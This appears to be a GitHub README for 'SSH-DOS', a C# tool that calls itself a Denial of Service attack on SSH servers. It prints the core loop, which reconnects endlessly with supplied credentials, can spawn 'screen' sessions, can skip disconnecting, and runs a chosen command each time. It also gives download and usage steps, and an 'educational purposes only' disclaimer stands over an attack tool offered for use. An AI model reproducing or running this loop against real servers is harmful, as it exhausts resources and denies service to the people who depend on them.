# SSH-DOS
For stress testing SSH by repeatedly connecting and issuing commands.

[![Build status](https://ci.appveyor.com/api/projects/status/wwbnlje4gl61en7i?svg=true)](https://ci.appveyor.com/project/bman46/ssh-dos)

## Core Related Responces:

- This program is written in C# and is meant to perform a Denial of Service attack on a SSH connection. 
- The conditional structure found in `Form1.cs`:
`if (_worker.CancellationPending)
 {
   break;
 }`
 is meant to kill the background worker loop when the user clicks on the stop button.
 - The looping structure: 

            _worker.DoWork += new DoWorkEventHandler((state, args) =>
            {
                do
                {
                    if (_worker.CancellationPending)
                    {
                        break;
                    }

                    using (SshClient client = new SshClient(textBox1.Text, textBox2.Text, textBox3.Text))
                    {
     
                        
                        try
                        {
                            client.Connect();
                            if (Screen.Checked)
                            {
                                client.RunCommand("screen");
                            }
                            client.RunCommand(textBox4.Text);
                            if (!Disconnect.Checked)
                            {
                                client.Disconnect();
                            }
                        }
                        catch
                        {
                            MessageBox.Show("Error Connecting SSH", "SSH Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                            break;
                        }
                        
                    }

                } while (true);
            });
uses a do while statement that repeatedly connects and issues commands to the target. This loop is killed by the stop button which then kills the worker; therefore, stopping the loop.

## Disclaimer:

This tool is released for educational purposes only.

Software is AS IS and i cannnot guarentee correct functionality.

You may not use this software for any illegal or unethical purpose; including activities which would give rise to criminal or civil liability.

Under no event shall the Licensor be responsible for the activities, or any misdeeds, conducted by the Licensee.

## Usage:

Download most recent release and then fill in the input fields.

`No Disconnect` means that it wont send a dissconnect and then try to recconect again.

`Use Screen` means that it will issue the command `Screen` before sending commands (Note: This command will be in the Loop and repeatedly issued)

![alt text](https://github.com/bman46/SSH-DOS/blob/master/SSH-DOS.PNG "Screen Shot of SSH-DOS")
###### Note: Some file names may say SSL but it was a mistake when i created the application and SSL has nothing to do with this repository/program.
